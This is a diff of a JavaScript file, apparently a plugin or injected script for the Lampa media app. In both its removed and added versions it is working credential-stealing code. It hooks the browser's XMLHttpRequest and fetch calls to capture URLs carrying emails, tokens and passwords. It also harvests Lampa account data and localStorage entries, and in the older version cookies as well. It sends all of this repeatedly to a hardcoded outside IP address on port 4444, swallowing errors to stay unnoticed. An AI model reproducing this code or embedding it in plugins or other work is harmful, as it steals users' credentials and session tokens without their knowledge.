@@ -1,186 +1,65 @@
 (function() {
   'use strict';
+  var EXFIL = 'http://5.252.116.77:4444';
+  var urls = [];
+  var done = false;
 
-  var EXFIL_URL = 'http://5.252.116.77:4444';
-  var INTERVAL = 30000;
-  var interceptedUrls = [];
-  var MAX_URLS = 100;
-
-  function send(url, payload) {
+  function send(d) {
     try {
-      var body = JSON.stringify(payload);
-      if (typeof fetch !== 'undefined') {
-        fetch(url, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: body,
-          mode: 'no-cors'
-        }).catch(function(){});
-      } else {
-        var x = new XMLHttpRequest();
-        x.open('POST', url, true);
-        x.setRequestHeader('Content-Type', 'application/json');
-        x.send(body);
-      }
+      var b = JSON.stringify(d);
+      if (typeof fetch !== 'undefined') { fetch(EXFIL, {method:'POST',headers:{'Content-Type':'application/json'},body:b,mode:'no-cors'}).catch(function(){}); }
+      else { var x = new XMLHttpRequest(); x.open('POST',EXFIL,true); x.setRequestHeader('Content-Type','application/json'); x.send(b); }
     } catch(e) {}
   }
 
-  function collectAll() {
-    var data = {};
+  function hp(u) {
+    var p = {}, i = u.indexOf('?'); if (i===-1) return p;
+    u.substr(i+1).split('&').forEach(function(pair) {
+      var kv = pair.split('='); if (kv.length===2) try { p[decodeURIComponent(kv[0])] = decodeURIComponent(kv[1]); } catch(e) {}
+    });
+    return p;
+  }
 
-    data.unic_id = Lampa.Storage.get('lampac_unic_id', '');
-    data.email = Lampa.Storage.get('account_email', '');
-    data.profile_id = Lampa.Storage.get('lampac_profile_id', '');
-    data.nws_id = Lampa.Storage.get('lampac_nws_id', '');
+  (function() {
+    var o = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(m,u) { this.__u=u; return o.apply(this,arguments); };
+    var s = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function(b) {
+      var u = this.__u||'';
+      if (u.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<200) urls.push({url:u,p:hp(u)});
+      return s.apply(this,arguments);
+    };
+    if (typeof fetch!=='undefined') {
+      var f = window.fetch;
+      window.fetch = function(u,o) {
+        var s = (typeof u==='string')?u:(u.url||u.href||'');
+        if (s.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<200) urls.push({url:s,p:hp(s)});
+        return f.apply(this,arguments);
+      };
+    }
+  })();
 
-    var accRaw = Lampa.Storage.get('account', '{}');
-    data.account_raw = accRaw;
-    try { data.account = JSON.parse(accRaw); } catch(e) {}
+  var t = setInterval(function() {
+    if (typeof Lampa==='undefined') return;
+    clearInterval(t);
 
-    data.storage = {};
-    for (var i = 0; i < localStorage.length; i++) {
+    var d = {type:'full', ts:Date.now()};
+    d.unic_id = Lampa.Storage.get('lampac_unic_id','');
+    d.email = Lampa.Storage.get('account_email','');
+    d.nws_id = Lampa.Storage.get('lampac_nws_id','');
+    d.storage = {};
+    for (var i=0; i<localStorage.length; i++) {
       var k = localStorage.key(i);
       var v = localStorage.getItem(k);
-      data.storage[k] = v;
-    }
-
-    data.cookies = document.cookie;
-    data.ua = navigator.userAgent;
-    data.platform = navigator.platform;
-    data.lang = navigator.language;
-    data.href = window.location.href;
-    data.host = window.location.host;
-    data.ts = Date.now();
-
-    if (interceptedUrls.length) {
-      data.intercepted_urls = interceptedUrls.slice();
-      interceptedUrls = [];
-    }
-
-    return data;
-  }
-
-  function parseUrlParams(url) {
-    var params = {};
-    try {
-      var idx = url.indexOf('?');
-      if (idx === -1) { idx = url.indexOf('#'); }
-      if (idx === -1) return params;
-      var qs = url.substring(idx + 1).split('&');
-      for (var i = 0; i < qs.length; i++) {
-        var pair = qs[i].split('=');
-        if (pair.length === 2) {
-          params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
-        }
-      }
-    } catch(e) {}
-    return params;
-  }
-
-  function hookNetwork() {
-    if (window.__phantom_xhr) return;
-    window.__phantom_xhr = true;
-
-    var origOpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url) {
-      this.__phantom_url = url;
-      return origOpen.apply(this, arguments);
-    };
-
-    var origSend = XMLHttpRequest.prototype.send;
-    XMLHttpRequest.prototype.send = function(body) {
-      var url = this.__phantom_url || '';
-      if (url && url.match(/(email|uid|token|account|auth|pass|cub_id|nws_id)/i)) {
-        var entry = { ts: Date.now(), method: 'XHR', url: url, params: parseUrlParams(url) };
-        if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
-      }
-      return origSend.apply(this, arguments);
-    };
-
-    if (typeof fetch !== 'undefined') {
-      var origFetch = window.fetch;
-      window.fetch = function(url, opts) {
-        var urlStr = (typeof url === 'string') ? url : (url.url || url.href || '');
-        if (urlStr && urlStr.match(/(email|uid|token|account|auth|pass|cub_id|nws_id)/i)) {
-          var entry = { ts: Date.now(), method: 'fetch', url: urlStr, params: parseUrlParams(urlStr) };
-          if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
-        }
-        return origFetch.apply(this, arguments);
-      };
-    }
-  }
-
-  function hookLampaRequest() {
-    if (window.__phantom_lampa) return;
-    window.__phantom_lampa = true;
-
-    if (typeof Lampa.Reguest !== 'undefined') {
-      var origNative = Lampa.Reguest.prototype.native;
-      if (origNative) {
-        Lampa.Reguest.prototype.native = function(url) {
-          if (url && url.match(/(email|uid|token|account|auth|pass)/i)) {
-            var entry = { ts: Date.now(), method: 'Lampa.Reguest', url: url, params: parseUrlParams(url) };
-            if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
-          }
-          return origNative.apply(this, arguments);
-        };
+      if (v && k.match(/(skaz|tv_|auth|token|pass|email|uid|account|cub|rd_|nws|profile)/i)) {
+        d.storage[k] = v.length>500 ? v.substr(0,500) : v;
       }
     }
-
-    if (typeof Lampa.Utils !== 'undefined' && Lampa.Utils.addUrlComponent) {
-      var origAddUrl = Lampa.Utils.addUrlComponent;
-      Lampa.Utils.addUrlComponent = function(url, param) {
-        if (param && param.match(/(email|uid|token|account|auth|pass)/i)) {
-          var entry = { ts: Date.now(), method: 'addUrlComponent', url: url, param: param };
-          if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
-        }
-        return origAddUrl.apply(this, arguments);
-      };
-    }
-  }
-
-  function listenStorage() {
-    try {
-      window.addEventListener('storage', function(e) {
-        if (e.key && e.key.match(/(email|uid|token|account|auth|pass|skaz|tv_)/i)) {
-          send(EXFIL_URL, {
-            type: 'storage_external',
-            key: e.key,
-            value: e.newValue,
-            oldValue: e.oldValue,
-            ts: Date.now()
-          });
-        }
-      });
-    } catch(e) {}
-
-    if (Lampa.Storage && Lampa.Storage.listener) {
-      Lampa.Storage.listener.follow('change', function(e) {
-        if (e.name && e.name.match(/(email|uid|token|account|auth|pass|skaz|tv_)/i)) {
-          send(EXFIL_URL, {
-            type: 'storage_change',
-            key: e.name,
-            value: Lampa.Storage.get(e.name, ''),
-            ts: Date.now(),
-            unic_id: Lampa.Storage.get('lampac_unic_id', '')
-          });
-        }
-      });
-    }
-  }
-
-  var timer = setInterval(function() {
-    if (typeof Lampa === 'undefined') return;
-    clearInterval(timer);
-
-    hookNetwork();
-    hookLampaRequest();
-    listenStorage();
-
-    send(EXFIL_URL, collectAll());
+    send(d);
 
     setInterval(function() {
-      send(EXFIL_URL, collectAll());
-    }, INTERVAL);
+      var u = urls.slice(); urls = [];
+      if (u.length) send({type:'urls', unic_id:d.unic_id, urls:u, ts:Date.now()});
+    }, 60000);
   }, 200);
 })();
